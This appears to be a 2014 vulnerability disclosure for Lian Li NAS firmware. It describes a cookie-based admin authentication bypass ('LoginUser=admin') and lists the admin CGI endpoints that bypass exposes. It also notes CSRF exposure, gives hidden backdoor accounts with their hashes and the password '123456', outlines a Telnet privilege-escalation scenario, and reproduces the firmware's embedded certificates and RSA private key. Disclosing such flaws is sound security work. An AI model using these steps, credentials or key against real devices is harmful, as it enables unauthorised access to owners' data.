@@ -1,0 +1,327 @@
+# Exploit Title: Lian Li NAS Multiple vulnerabilities
+# Date: 21/07/2014
+# Exploit Author: pws
+# Vendor Homepage: http://www.lian-li.com/en/dt_portfolio_category/nas/
+# Firmware Link: https://www.dropbox.com/s/imvkndl8m5yj7qp/G5S604121826700.tar.gz
+# Tested on: Latest version
+# CVE : None yet
+
+1. Hardcoded cookie to access the admin section
+
+File: /javascript/storlib.js
+function get_cookie()
+{
+	var allcookies = document.cookie;
+	var pos = allcookies.indexOf("LoginUser=admin");
+	if (pos == -1)
+		location = "/index.html";
+}
+
+2. Authentication bypass
+
+Create such cookie: 'LoginUser=admin' (document.cookie='LoginUser=admin').
+Then, access the URL directly to get admin features.
+
+Eg. 
+http://192.168.1.1/cgi/telnet/telnet.cgi # enable/disable the Telnet server
+http://192.168.1.1/cgi/user/user.cgi     # manage users (change passwords, add user, ...)
+
+Here are all the cgi's accessible (firmware: G5S604121826700) :
+
+cgi/lan/lan.cgi
+cgi/lan/lan_nasHandler.cgi
+cgi/lan/lan_routerHandler.cgi
+cgi/information/information.cgi
+cgi/return/return.cgi
+cgi/account/account.cgi
+cgi/account/accountHandler.cgi
+cgi/lang/lang.cgi
+cgi/lang/langHandler.cgi
+cgi/backup/clear.cgi
+cgi/backup/fixed.cgi
+cgi/backup/ipaddress.cgi
+cgi/backup/listing.cgi
+cgi/backup/s.cgi
+cgi/backup/schedule.cgi
+cgi/backup/source.cgi
+cgi/backup/dd_schedule.cgi
+cgi/backup/decide.cgi
+cgi/backup/ipaddress1.cgi
+cgi/backup/s1.cgi
+cgi/backup/source1.cgi
+cgi/backup/ipaddress2.cgi
+cgi/backup/s2.cgi
+cgi/backup/source2.cgi
+cgi/backup/ipaddress3.cgi
+cgi/backup/s3.cgi
+cgi/backup/source3.cgi
+cgi/backup/ipaddress5.cgi
+cgi/backup/s5.cgi
+cgi/backup/source5.cgi
+cgi/backup/l.cgi
+cgi/backup/listing1.cgi
+cgi/backup/listing2.cgi
+cgi/backup/listing3.cgi
+cgi/backup/listing5.cgi
+cgi/backup/email.cgi
+cgi/backup/email1.cgi
+cgi/backup/fixed1.cgi
+cgi/backup/schedule1.cgi
+cgi/backup/email2.cgi
+cgi/backup/fixed2.cgi
+cgi/backup/schedule2.cgi
+cgi/backup/email3.cgi
+cgi/backup/fixed3.cgi
+cgi/backup/schedule3.cgi
+cgi/backup/dd_schedule1.cgi
+cgi/backup/dd_schedule2.cgi
+cgi/backup/dd_schedule3.cgi
+cgi/backup/dd_schedule5.cgi
+cgi/backup/email5.cgi
+cgi/backup/fixed5.cgi
+cgi/backup/schedule5.cgi
+cgi/backup/fixed6.cgi
+cgi/backup/ipaddress6.cgi
+cgi/backup/listing6.cgi
+cgi/backup/s6.cgi
+cgi/backup/email6.cgi
+cgi/backup/schedule6.cgi
+cgi/backup/source6.cgi
+cgi/backup/dd_schedule6.cgi
+cgi/backup/fixed4.cgi
+cgi/backup/ipaddress4.cgi
+cgi/backup/listing4.cgi
+cgi/backup/s4.cgi
+cgi/backup/email4.cgi
+cgi/backup/schedule4.cgi
+cgi/backup/source4.cgi
+cgi/backup/dd_schedule4.cgi
+cgi/backup/emessage.cgi
+cgi/backup/emessage_fail.cgi
+cgi/group/group.cgi
+cgi/group/groupHandler.cgi
+cgi/group/groupDeleteHandler.cgi
+cgi/group/groupMembers.cgi
+cgi/group/groupMembersHandler.cgi
+cgi/user/user.cgi
+cgi/user/userHandler.cgi
+cgi/user/userDeleteHandler.cgi
+cgi/user/userMembership.cgi
+cgi/user/userMembershipHandler.cgi
+cgi/time/time.cgi
+cgi/time/timeHandler.cgi
+cgi/power/power.cgi
+cgi/power/powerHandler.cgi
+cgi/factoryReset/factoryReset.cgi
+cgi/factoryReset/factoryResetHandler.cgi
+cgi/restoreConfig/restoreConfig.cgi
+cgi/restoreConfig/restoreConfigHandler.cgi
+cgi/saveConfig/saveConfig.cgi
+cgi/saveConfig/saveConfigHandler.cgi
+cgi/diskUsage/diskUsage.cgi
+cgi/diskUsage/diskUsageuser.cgi
+cgi/diskUsage/diskUsageHandler.cgi
+cgi/diskUsage/diskUsageuserHandler.cgi
+cgi/diskUtility/diskUtility.cgi
+cgi/diskUtility/diskUtilityHandler.cgi
+cgi/diskUtility/healthReport.cgi
+cgi/dhcpserver/dhcpserver.cgi
+cgi/dhcpserver/dhcpserverHandler.cgi
+cgi/dhcpserver/dhcplease.cgi
+cgi/dhcpserver/dhcpleaseHandler.cgi
+cgi/dhcpserver/dhcpstatic.cgi
+cgi/dhcpserver/dhcpstaticHandler.cgi
+cgi/dhcpserver/staticipDeleteHandler.cgi
+cgi/errorAlert/errorAlert.cgi
+cgi/errorAlert/errorAlertHandler.cgi
+cgi/share/share.cgi
+cgi/share/shareHandler.cgi
+cgi/share/shareDeleteHandler.cgi
+cgi/share/share_nonLinux.cgi
+cgi/share/share_nonLinuxHandler.cgi
+cgi/share/share_Linux.cgi
+cgi/share/share_LinuxHandler.cgi
+cgi/fileServer/fileServer.cgi
+cgi/fileServer/fileServerHandler.cgi
+cgi/log_system/log_system.cgi
+cgi/log_system/log_systemHandler.cgi
+cgi/log_admin/log_admin.cgi
+cgi/log_admin/log_adminHandler.cgi
+cgi/log_dhcp/log_dhcp.cgi
+cgi/log_dhcp/log_dhcpHandler.cgi
+cgi/log_ftp/log_ftp.cgi
+cgi/log_ftp/log_ftpHandler.cgi
+cgi/log_samba/log_samba.cgi
+cgi/log_samba/log_sambaHandler.cgi
+cgi/printer/printer.cgi
+cgi/printer/printerHandler.cgi
+cgi/upgrade2/upgrade.cgi
+cgi/upgrade2/upgradeHandler.cgi
+cgi/wizard/wizard.cgi
+cgi/wizard/language.cgi
+cgi/wizard/languageHandler.cgi
+cgi/wizard/password.cgi
+cgi/wizard/passwordHandler.cgi
+cgi/wizard/hostname.cgi
+cgi/wizard/hostnameHandler.cgi
+cgi/wizard/tcpip.cgi
+cgi/wizard/tcpipHandler.cgi
+cgi/wizard/time.cgi
+cgi/wizard/timeHandler.cgi
+cgi/wizard/confirm.cgi
+cgi/wizard/confirmHandler.cgi
+cgi/wizard/addUser.cgi
+cgi/wizard/user.cgi
+cgi/wizard/userHandler.cgi
+cgi/wizard/userMembership.cgi
+cgi/wizard/userMembershipHandler.cgi
+cgi/wizard/userSharePermission.cgi
+cgi/wizard/userSharePermissionHandler.cgi
+cgi/wizard/addGroup.cgi
+cgi/wizard/group.cgi
+cgi/wizard/groupHandler.cgi
+cgi/wizard/groupMembers.cgi
+cgi/wizard/groupMembersHandler.cgi
+cgi/wizard/groupSharePermission.cgi
+cgi/wizard/groupSharePermissionHandler.cgi
+cgi/wizard/addShare.cgi
+cgi/wizard/share.cgi
+cgi/wizard/shareHandler.cgi
+cgi/wizard/sharePermission.cgi
+cgi/wizard/sharePermissionHandler.cgi
+cgi/wizard/nfsPermission.cgi
+cgi/wizard/nfsPermissionHandler.cgi
+cgi/wizard/button.cgi
+cgi/telnet/telnet.cgi
+cgi/telnet/telnetHandler.cgi
+cgi/bonjour/bonjour.cgi
+cgi/bonjour/bonjourHandler.cgi
+cgi/raid/raid.cgi
+cgi/raid/raidHandler.cgi
+cgi/swupdate/swupdate.cgi
+cgi/swupdate/swupdateHandler.cgi
+cgi/swupdate/installHandler.cgi
+cgi/swupdate/swlist.cgi
+cgi/swupdate/swlistHandler.cgi
+
+All forms on those cgi pages can be used to perform CSRF attacks (to target internal network for example).
+
+3. Backdoored accounts
+
+Some users are not referenced in the management page but are present in the system. 
+Moreover, the robustness of such passwords is really poor (password = "123456"): 
+
+mysql:$1$$RmyPVMlhpXjJj8iv4w.Ul.:6000:6000:Linux User,,,:/home/mysql:/bin/sh
+daemon:$1$$RmyPVMlhpXjJj8iv4w.Ul.:7000:7000:Linux User,,,:/home/daemon:/bin/sh
+
+4. Privilege escalation "scenario"
+
+Enable Telnet server (if disabled)
+Connect to it using one of the backdoored accounts and retrieve /etc/passwd file.
+It contains passwords for all accounts.
+
+5. Certificate used by the FTP server stored in the firmware
+
+cacert.pem
+
+subject=/C=AU/SOP=QLD/O=Mincom Pty. Ltd./OU=CS/CN=SSLeay demo server
+issuer= /C=AU/SOP=QLD/O=Mincom Pty. Ltd./OU=CS/CN=CA
+-----BEGIN X509 CERTIFICATE-----
+
+MIIBgjCCASwCAQQwDQYJKoZIhvcNAQEEBQAwODELMAkGA1UEBhMCQVUxDDAKBgNV
+BAgTA1FMRDEbMBkGA1UEAxMSU1NMZWF5L3JzYSB0ZXN0IENBMB4XDTk1MTAwOTIz
+MzIwNVoXDTk4MDcwNTIzMzIwNVowYDELMAkGA1UEBhMCQVUxDDAKBgNVBAgTA1FM
+RDEZMBcGA1UEChMQTWluY29tIFB0eS4gTHRkLjELMAkGA1UECxMCQ1MxGzAZBgNV
+BAMTElNTTGVheSBkZW1vIHNlcnZlcjBcMA0GCSqGSIb3DQEBAQUAA0sAMEgCQQC3
+LCXcScWua0PFLkHBLm2VejqpA1F4RQ8q0VjRiPafjx/Z/aWH3ipdMVvuJGa/wFXb
+/nDFLDlfWp+oCPwhBtVPAgMBAAEwDQYJKoZIhvcNAQEEBQADQQArNFsihWIjBzb0
+DCsU0BvL2bvSwJrPEqFlkDq3F4M6EGutL9axEcANWgbbEdAvNJD1dmEmoWny27Pn
+IMs6ZOZB
+-----END X509 CERTIFICATE-----
+
+server-cert.pem
+
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 1 (0x1)
+        Signature Algorithm: sha1WithRSAEncryption
+        Issuer: C=TW, ST=Taipei, O=Storm, OU=software, CN=aaron/emailAddress=aaron@storlinksemi.com
+        Validity
+            Not Before: Jan  3 00:46:50 2007 GMT
+            Not After : Jan  3 00:46:50 2008 GMT
+        Subject: C=TW, ST=Taipei, L=Hsinchu, O=Storm, OU=software, CN=aaron/emailAddress=aaron@storlinksemi.com
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+            RSA Public Key: (1024 bit)
+                Modulus (1024 bit):
+                    00:c4:1d:89:dc:9b:45:6c:96:e2:ad:e6:98:13:25:
+                    64:b4:54:f6:e4:97:74:d5:9f:15:1e:1d:45:a1:75:
+                    45:fc:3b:2b:9c:dd:e6:0d:34:4b:d7:6c:8d:d0:32:
+                    5f:39:25:ab:53:81:de:84:17:cf:27:0a:c2:26:82:
+                    9f:09:3f:a8:7e:8c:31:c3:fe:43:75:fe:1f:53:8e:
+                    74:0e:31:d2:55:71:51:1b:7a:01:e3:57:4f:f7:d6:
+                    9f:1d:39:19:42:3c:a1:bd:08:d1:99:69:fc:1c:34:
+                    6e:0f:fb:a7:36:f5:77:bf:95:c8:1d:50:30:25:59:
+                    23:39:d3:27:5a:06:0a:05:6d
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Basic Constraints: 
+                CA:FALSE
+            Netscape Comment: 
+                OpenSSL Generated Certificate
+            X509v3 Subject Key Identifier: 
+                61:19:1F:04:38:83:83:E0:CD:6A:8C:CA:F9:9C:6E:D3:7F:C5:55:C3
+            X509v3 Authority Key Identifier: 
+                keyid:F6:E9:49:A1:24:01:C1:0A:4C:7F:6A:E7:58:B8:95:BC:AF:95:B4:F7
+                DirName:/C=TW/ST=Taipei/O=Storm/OU=software/CN=aaron/emailAddress=aaron@storlinksemi.com
+                serial:00
+
+    Signature Algorithm: sha1WithRSAEncryption
+        5b:b7:dc:28:58:5e:53:c5:d7:88:be:71:21:43:b5:db:a1:d7:
+        fc:de:38:1d:38:e7:b3:a4:a5:64:92:1b:67:1b:c8:3e:0f:a9:
+        16:77:0c:0b:bf:e9:d2:b5:70:cd:05:71:df:1a:db:2a:c8:56:
+        5d:91:1c:ef:2b:16:b3:f0:55:89:ba:35:e4:ae:07:6c:4a:c5:
+        d0:0d:e3:1b:1d:5e:fd:01:b2:52:0e:fe:05:08:ed:40:26:e6:
+        b0:2b:24:2f:0d:42:11:f0:d9:b4:6d:db:ce:d1:b1:65:77:62:
+        7a:06:8b:09:c7:33:f3:43:13:a7:33:47:af:5c:6a:39:4e:8f:
+        64:5c
+-----BEGIN CERTIFICATE-----
+MIIDezCCAuSgAwIBAgIBATANBgkqhkiG9w0BAQUFADB4MQswCQYDVQQGEwJUVzEP
+MA0GA1UECBMGVGFpcGVpMQ4wDAYDVQQKEwVTdG9ybTERMA8GA1UECxMIc29mdHdh
+cmUxDjAMBgNVBAMTBWFhcm9uMSUwIwYJKoZIhvcNAQkBFhZhYXJvbkBzdG9ybGlu
+a3NlbWkuY29tMB4XDTA3MDEwMzAwNDY1MFoXDTA4MDEwMzAwNDY1MFowgYoxCzAJ
+BgNVBAYTAlRXMQ8wDQYDVQQIEwZUYWlwZWkxEDAOBgNVBAcTB0hzaW5jaHUxDjAM
+BgNVBAoTBVN0b3JtMREwDwYDVQQLEwhzb2Z0d2FyZTEOMAwGA1UEAxMFYWFyb24x
+JTAjBgkqhkiG9w0BCQEWFmFhcm9uQHN0b3JsaW5rc2VtaS5jb20wgZ8wDQYJKoZI
+hvcNAQEBBQADgY0AMIGJAoGBAMQdidybRWyW4q3mmBMlZLRU9uSXdNWfFR4dRaF1
+Rfw7K5zd5g00S9dsjdAyXzklq1OB3oQXzycKwiaCnwk/qH6MMcP+Q3X+H1OOdA4x
+0lVxURt6AeNXT/fWnx05GUI8ob0I0Zlp/Bw0bg/7pzb1d7+VyB1QMCVZIznTJ1oG
+CgVtAgMBAAGjggEAMIH9MAkGA1UdEwQCMAAwLAYJYIZIAYb4QgENBB8WHU9wZW5T
+U0wgR2VuZXJhdGVkIENlcnRpZmljYXRlMB0GA1UdDgQWBBRhGR8EOIOD4M1qjMr5
+nG7Tf8VVwzCBogYDVR0jBIGaMIGXgBT26UmhJAHBCkx/audYuJW8r5W096F8pHow
+eDELMAkGA1UEBhMCVFcxDzANBgNVBAgTBlRhaXBlaTEOMAwGA1UEChMFU3Rvcm0x
+ETAPBgNVBAsTCHNvZnR3YXJlMQ4wDAYDVQQDEwVhYXJvbjElMCMGCSqGSIb3DQEJ
+ARYWYWFyb25Ac3RvcmxpbmtzZW1pLmNvbYIBADANBgkqhkiG9w0BAQUFAAOBgQBb
+t9woWF5TxdeIvnEhQ7Xbodf83jgdOOezpKVkkhtnG8g+D6kWdwwLv+nStXDNBXHf
+GtsqyFZdkRzvKxaz8FWJujXkrgdsSsXQDeMbHV79AbJSDv4FCO1AJuawKyQvDUIR
+8Nm0bdvO0bFld2J6BosJxzPzQxOnM0evXGo5To9kXA==
+-----END CERTIFICATE-----
+
+server-key.pem
+
+-----BEGIN RSA PRIVATE KEY-----
+MIICXQIBAAKBgQDEHYncm0VsluKt5pgTJWS0VPbkl3TVnxUeHUWhdUX8Oyuc3eYN
+NEvXbI3QMl85JatTgd6EF88nCsImgp8JP6h+jDHD/kN1/h9TjnQOMdJVcVEbegHj
+V0/31p8dORlCPKG9CNGZafwcNG4P+6c29Xe/lcgdUDAlWSM50ydaBgoFbQIDAQAB
+AoGBAIKcZZd99aOXbcqBm+CMc+BCAdhGInKvK0JOHnSkhQKyaZ5kjnVW0ffb/Sqe
+kZqewtav1IFG1hjbamh5b++Z7N2F+jshPnacdBXrgT4PPUfj3+ZirXlyckxJv3YT
+Ql1bLsaCMne2b4sUuGsldROfiXfOR5SDUhbHocQj+mj8C/OlAkEA/4TfMZJqIkAx
+W7uwPqX7c6k1XhLwC5tjEkyZA3jhgLMCDzw1RGxO65haVyKm//e4f1S7ctQ/v80j
+Rret0A4cnwJBAMR8CqOpKI7W4Qao2aIYmL36a9VIFWoNunlmuSUW/KiBkAGhfGBn
++VG0uueM4PdOWl0i45SyZxTiYUjxE+BSlnMCQQDp611dB3osYvIM1dVydQevCgA2
+YEXrilR3YzJNkHN5G+fNxMPLIRBa9H33+VxDRyhbQVndtNurnoQl8G+p4dFnAkA5
+Ftl4iBPyvNiROMpTYNYwjOx8Af/G2spNr90nu7AZvdt7vdIHqO42IU8VLEfJU4jJ
++vMpJ1TwKn6d1P4zdYulAkB1FPvPcRmn1P69b2tDGEeoSNbh4s7eqV7AntDGeQhp
+ppiLtY+nlj+Mjs2pHLa1bRAWcQRl/GYU4rdF6Py9F/w/
+-----END RSA PRIVATE KEY-----
